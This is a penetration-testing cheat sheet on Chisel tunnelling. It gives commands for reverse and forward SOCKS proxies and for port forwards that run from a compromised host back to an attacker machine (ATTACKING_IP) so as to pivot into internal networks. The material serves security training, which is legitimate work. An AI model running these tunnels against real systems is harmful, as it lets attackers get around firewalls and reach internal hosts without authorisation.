---
description: >-
  Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH.
  Single executable including both client and server. Written in Go (golang).
  Chisel is mainly useful for passing through firewal
---

# Chisel

{% embed url="https://github.com/jpillora/chisel" %}

### Reverse SOCKS Proxy

Reverse SOCKS Proxy connects back from a compromised server to a listener waiting on our attacking machine.

```bash
#Attacking machine
./chisel server -p LISTEN_PORT --reverse &

#Compromised host
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

```
"Note !!"
Despite connecting back to port `LISTEN_PORT`, the actual proxy has been opened on 127.0.0.1:`XXXX`. 
As such, we will be using port `XXXX` when sending data through the proxy.
```

* Note the use of `R:socks` in this command. "R" is prefixed to remotes when connecting to a chisel server that has been started in reverse mode. It essentially tells the **chisel client** that the server **anticipates the proxy** or **port forward** to be made at the **client side** (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server).

***

### Forward SOCKS Proxy

Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections).

```bash
#Compromised host
./chisel server -p LISTEN_PORT --socks5

#Attacking machine
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks

//PROXY_PORT - port that will be opened for the proxy.
```

* For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.

***

### Remote Port Forward

A remote port forward is when we connect back from a compromised target to create the forward.

```bash
#Attacking machine
./chisel server -p LISTEN_PORT --reverse &

#Compromised host
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &

// LISTEN_PORT - the port that started the chisel server on
// LOCAL_PORT - the port that needs to be opened on the attacking machine to link with the desired target port.
```

* For example ,assume that the IP is `172.16.0.20`, the compromised server `172.16.0.5`, and our target is port `22` on `172.16.0.10`.
* The syntax for forwarding `172.16.0.10:22` back to port `2222` on our attacking machine would be as follows: `./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &` Connecting back to the attacking machine, functioning as a chisel server started with: `./chisel server -p 1337 --reverse &`
* This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.

***

### Local Port Forward

As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

```bash
#Compromised host
./chisel server -p LISTEN_PORT

#Attacking machine
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

* For example, to connect to `172.16.0.5:8000` (the **compromised host** running a **chisel server**), forwarding our **local port** `2222` to `172.16.0.10:22` (our intended target), use: `./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`

### Use Cases&#x20;
